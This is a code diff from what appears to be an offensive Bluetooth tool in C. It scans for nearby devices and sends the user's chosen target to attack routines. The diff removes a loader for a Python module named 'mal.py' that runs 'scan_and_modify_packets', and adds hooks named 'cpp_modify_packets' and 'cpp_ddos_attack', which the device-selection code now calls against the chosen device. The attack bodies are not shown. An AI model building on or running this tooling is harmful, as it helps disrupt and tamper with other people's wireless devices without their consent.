@@ -6,30 +6,11 @@
 #include <bluetooth/hci.h>
 #include <bluetooth/hci_lib.h>
 #include <bluetooth/rfcomm.h>
-#include <python3.13/Python.h>
 #include "threads.h"
-
-void load_py(const char *mac_address){
-	Py_Initialize();
-	PyObject *pModule = PyImport_ImportModule("mal.py");
-	if (pModule == NULL){
-		PyErr_Print();
-		fprintf(stderr , "Failed To Load Python");
-		exit(1);
-	}
-	PyObject *pFunc = PyObject_GetAttrString(pModule, "scan_and_modify_packets");
-		if (!pFunc || !PyCallable_Check(pFunc)) {
-        		PyErr_Print();
-        		fprintf(stderr, "Failed to get Python function\n");
-        		exit(1);
-	}
-	PyObject *pArgs = PyTuple_Pack(1, PyUnicode_FromString(mac_address));
-        PyObject_CallObject(pFunc, pArgs);
-    	Py_XDECREF(pArgs);
-    	Py_XDECREF(pFunc);
-    	Py_XDECREF(pModule);
-    	Py_Finalize();
-}
+#ifdef USING_CXX
+void cpp_modify_packets(const bdaddr_t* target_addr);
+void cpp_ddos_attack(const bdaddr_t* target_addr);
+#endif
 
 void scan_devices(bdaddr_t *target_addr) {
     inquiry_info *devices = NULL;
@@ -84,7 +65,7 @@ void scan_devices(bdaddr_t *target_addr) {
 		bdaddr_t device;
 		run_threads(&device , msg);
 	}else{
-		load_py(&devices[choice]);
+		cpp_ddos_attack(&(devices + choice - 1)->bdaddr);
 	}
     if (choice < 1 || choice > num_rsp) {
         printf("Invalid choice.\n");
